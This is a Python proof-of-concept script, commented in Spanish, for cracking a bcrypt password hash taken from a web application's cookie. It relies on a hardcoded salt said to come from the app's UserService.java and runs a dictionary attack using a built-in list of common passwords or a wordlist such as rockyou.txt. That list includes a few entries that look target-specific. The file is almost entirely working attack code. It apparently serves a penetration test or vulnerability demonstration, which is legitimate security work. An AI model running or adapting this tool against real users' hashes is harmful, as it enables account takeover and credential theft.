# -*- coding: utf-8 -*-
import bcrypt
import time
import sys

class BCryptCrackingPOC:
    
    def __init__(self, target_hash, known_salt):
        self.target_hash = target_hash
        self.known_salt = known_salt
        self.attempts = 0
        self.start_time = None
    
    def verify_password(self, password):
        """
        Verifica si una contraseña coincide con el hash objetivo.
        Usa el salt hardcodeado conocido.
        """
        self.attempts += 1
        try:
            candidate_hash = bcrypt.hashpw(
                password.encode('utf-8'),
                self.known_salt.encode('utf-8')
            ).decode('utf-8')
            
            return candidate_hash == self.target_hash
        except Exception as e:
            return False
    
    def dictionary_attack(self, wordlist_file=None):
        
        # Diccionario común de contraseñas 
        common_passwords = [
            "dwY39quEdt7MZ4g", "123456", "password", "12345678", "qwerty", "123456789",
            "12345", "1234", "111111", "1234567", "dragon",
            "123123", "baseball", "iloveyou", "trustno1", "monkey",
            "1234567890", "sunshine", "princess", "football", "shadow",
            "michael", "ashley", "bailey", "passw0rd", "batman",
            "master", "admin", "letmein", "welcome", "login",
            "solo", "qwertyuiop", "starwars", "121212", "freedom",
            "whatever", "mustang", "access", "superman", "696969",
            "test", "test123", "demo", "user", "changeme",
            "password1", "password123", "pass", "pass123", "root",
            "Bananamistica3!", "bananamistica", "Test123!", "Admin123",
        ]
        
        if wordlist_file:
            try:
                with open(wordlist_file, 'r', encoding='utf-8', errors='ignore') as f:
                    common_passwords = [line.strip() for line in f if line.strip()]
                print(f"[+] Wordlist cargada: {len(common_passwords)} contrasenas")
            except Exception as e:
                print(f"[!] Error cargando wordlist: {e}")
                print("[*] Usando diccionario por defecto")
        
        print(f"[*] Probando {len(common_passwords)} contrasenas...")
        print()
        
        self.start_time = time.time()
        
        for i, password in enumerate(common_passwords, 1):
            if i % 10 == 0:
                elapsed = time.time() - self.start_time
                rate = i / elapsed if elapsed > 0 else 0
                print(f"\r[*] Progreso: {i}/{len(common_passwords)} | "
                      f"{rate:.2f} intentos/seg | "
                      f"Tiempo: {elapsed:.1f}s", end='', flush=True)
            
            if self.verify_password(password):
                elapsed = time.time() - self.start_time
                print(f"\n\n{'='*70}")
                print(" CONTRASENA ENCONTRADA!")
                print("="*70)
                print(f"[+] Contrasena: {password}")
                print(f"[+] Intentos: {self.attempts}")
                print(f"[+] Tiempo: {elapsed:.2f} segundos")
                print(f"[+] Velocidad: {self.attempts/elapsed:.2f} intentos/seg")
                print("="*70)
                return password
        
        elapsed = time.time() - self.start_time
        print(f"\n\n[-] Contrasena no encontrada en el diccionario")
        print(f"[*] Total de intentos: {self.attempts}")
        print(f"[*] Tiempo total: {elapsed:.2f} segundos")
        return None

def main():
    
    # Configurar encoding para stdout en Windows/PowerShell
    if sys.stdout.encoding != 'utf-8':
        try:
            sys.stdout.reconfigure(encoding='utf-8')
        except:
            pass
    
    # Solicitar hash al usuario
    print("\n[?] Introduce el hash BCrypt capturado de la cookie:")
    print()
    
    target_hash_input = input("Hash: ").strip()
    
    target_hash = target_hash_input
    print("[+] Hash personalizado cargado")
    
    # Salt hardcodeado encontrado en UserService.java
    known_salt = "$2a$10$MN0gK0ldpCgN9jx6r0VYQO"
    
    print("\n[*] Hash objetivo:")
    print(f"    {target_hash}")
    print()
    print("[*] Salt hardcodeado (encontrado en codigo fuente):")
    print(f"    {known_salt}")
    print()
    
    poc = BCryptCrackingPOC(target_hash, known_salt)
    
    print("\n[?] Intentar crackear la contrasena? (s/n): ", end='')
    response = input().strip().lower()
    
    if response == 's':
        wordlist = input("[?] Ruta a wordlist (Enter para diccionario basico): ").strip()
        
        result = poc.dictionary_attack(wordlist if wordlist else None)
        
        if result:
            print("\n[+] Ataque exitoso. La contrasena ha sido comprometida.")
        else:
            print("\n[-] Intenta con un diccionario mas grande tipo rockyou.txt")

if __name__ == '__main__':
    try:
        # Verificar que bcrypt este instalado
        import bcrypt
    except ImportError:
        print("\n[!] ERROR: bcrypt no esta instalado")
        print("[*] Instalar con: pip install bcrypt")
        print()
        sys.exit(1)
    
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[!] Operacion cancelada por el usuario")
        sys.exit(0)